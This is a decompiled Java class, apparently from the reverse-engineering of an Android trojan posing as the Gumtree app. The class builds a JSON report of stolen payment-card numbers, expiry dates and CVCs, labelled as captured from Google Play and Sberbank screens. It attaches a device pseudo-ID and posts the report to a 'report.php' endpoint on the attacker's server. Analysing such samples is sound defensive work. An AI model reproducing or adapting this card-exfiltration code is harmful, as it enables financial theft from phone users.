package com.gumsis.injs.api.request;

import android.content.Context;
import com.gumsis.Realtalk;
import com.gumsis.api.request.HttpRequest;
import com.gumsis.api.request.HttpResponseHandler;
import com.gumsis.api.tls.TxtTls;
import com.gumsis.injs.api.response.SCResponse;
import com.gumsis.injs.g.model.GData;
import com.gumsis.injs.s.model.SModel;
import org.json.JSONObject;

public class SCRequest
  extends HttpRequest
{
  private static final String PATH = "report.php";
  private HttpResponseHandler<SCResponse> mResponseHandlerHandler;
  public Object model;
  
  public SCRequest(Context paramContext, Object paramObject, HttpResponseHandler<SCResponse> paramHttpResponseHandler)
  {
    super(paramContext, "report.php", 23);
    this.model = paramObject;
    try
    {
      this.data = TxtTls.getBytesUTF8(getHttpParams(paramContext));
      this.mResponseHandlerHandler = paramHttpResponseHandler;
      return;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  private String getGpHttpParams(Context paramContext, GData paramGData)
    throws Exception
  {
    JSONObject localJSONObject1 = new JSONObject();
    JSONObject localJSONObject2 = new JSONObject();
    localJSONObject2.put("id", Realtalk.getPsuedoID(paramContext));
    localJSONObject2.put("report", "logs");
    localJSONObject2.put("name", "google_play");
    Object localObject = "";
    if (paramGData.getCardNumber() != null) {
      localObject = paramGData.getCardNumber();
    }
    paramContext = (Context)localObject;
    if (paramGData.getExpDate() != null) {
      paramContext = (String)localObject + ", " + paramGData.getExpDate();
    }
    localObject = paramContext;
    if (paramGData.getCVC() != null) {
      localObject = paramContext + ", " + paramGData.getCVC();
    }
    localJSONObject2.put("process", localObject);
    localJSONObject1.put("1", localJSONObject2);
    return TxtTls.getPostParamsUTF8(localJSONObject1);
  }
  
  private String getSberHttpParams(Context paramContext, SModel paramSModel)
    throws Exception
  {
    JSONObject localJSONObject1 = new JSONObject();
    JSONObject localJSONObject2 = new JSONObject();
    localJSONObject2.put("id", Realtalk.getPsuedoID(paramContext));
    localJSONObject2.put("report", "logs");
    localJSONObject2.put("name", "sberbank");
    Object localObject = "";
    if (paramSModel.getCardNumber() != null) {
      localObject = paramSModel.getCardNumber();
    }
    paramContext = (Context)localObject;
    if (paramSModel.getExpDate() != null) {
      paramContext = (String)localObject + ", " + paramSModel.getExpDate();
    }
    localObject = paramContext;
    if (paramSModel.getCVC() != null) {
      localObject = paramContext + ", " + paramSModel.getCVC();
    }
    localJSONObject2.put("process", localObject);
    localJSONObject1.put("1", localJSONObject2);
    return TxtTls.getPostParamsUTF8(localJSONObject1);
  }
  
  protected String getHttpParams(Context paramContext)
    throws Exception
  {
    if ((this.model instanceof SModel)) {
      return getSberHttpParams(paramContext, (SModel)this.model);
    }
    return getGpHttpParams(paramContext, (GData)this.model);
  }
  
  public String getUrl()
  {
    return getBaseUrl();
  }
  
  protected void onReequestSuccess(JSONObject paramJSONObject)
  {
    SCResponse localSCResponse = new SCResponse();
    localSCResponse.parseSuccessResponse(paramJSONObject);
    if (this.mResponseHandlerHandler != null) {
      this.mResponseHandlerHandler.onResponse(this.requestType, localSCResponse);
    }
  }
  
  protected void onRequestFailure(int paramInt, String paramString)
  {
    SCResponse localSCResponse = new SCResponse();
    localSCResponse.parseFailureResponse(paramInt, paramString);
    if (this.mResponseHandlerHandler != null) {
      this.mResponseHandlerHandler.onResponse(this.requestType, localSCResponse);
    }
  }
  
  protected void onRequestSuccess(JSONObject paramJSONObject)
  {
    SCResponse localSCResponse = new SCResponse();
    localSCResponse.parseSuccessResponse(paramJSONObject);
    if (this.mResponseHandlerHandler != null) {
      this.mResponseHandlerHandler.onResponse(this.requestType, localSCResponse);
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/injs/api/request/SCRequest.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */